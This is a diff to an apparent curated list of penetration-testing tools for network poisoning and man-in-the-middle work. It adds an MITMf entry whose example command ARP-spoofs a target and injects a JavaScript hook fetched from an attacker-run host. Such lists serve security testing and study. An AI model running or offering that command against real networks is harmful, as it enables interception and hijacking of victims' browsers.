@@ -123,6 +123,8 @@
 
 * [Responder](https://github.com/SpiderLabs/Responder) - Open source NBT-NS, LLMNR, and MDNS poisoner.
 * [Responder-Windows](https://github.com/lgandx/Responder-Windows) - Windows version of the above NBT-NS/LLMNR/MDNS poisoner.
+* [MITMf](https://github.com/byt3bl33d3r/MITMf) - Multipurpose man-in-the-middle framework.
+  - e.g. `mitmf --arp --spoof -i eth0 --gateway 192.168.1.1 --targets 192.168.1.20 --inject --js-url http://192.168.1.137:3000/hook.js`
 * [dnschef](https://github.com/iphelix/dnschef) - Highly configurable DNS proxy for pentesters.
 * [mitmproxy](https://github.com/mitmproxy/mitmproxy) - Interactive TLS-capable intercepting HTTP proxy for penetration testers and software developers.
 * [Morpheus](https://github.com/r00t-3xp10it/morpheus) - Automated ettercap TCP/IP Hijacking tool.
